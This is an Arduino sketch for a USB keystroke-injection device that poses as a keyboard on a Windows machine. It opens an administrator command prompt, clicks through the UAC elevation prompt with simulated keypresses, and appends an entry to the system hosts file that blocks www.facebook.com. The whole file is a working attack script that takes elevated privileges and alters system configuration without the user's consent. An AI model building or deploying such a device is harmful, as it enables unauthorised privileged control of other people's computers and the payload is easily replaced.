#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}


void setup()
{

  Keyboard.begin();


  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.print("cmd");
  delay(100);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.print("cd drivers/etc");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("echo .>> hosts");
  delay(100);
  typeKey(KEY_RETURN);
  Keyboard.print("echo 0.0.0.0 www.facebook.com >> hosts");
  typeKey(KEY_RETURN);
  Keyboard.end();
}

void loop() {}
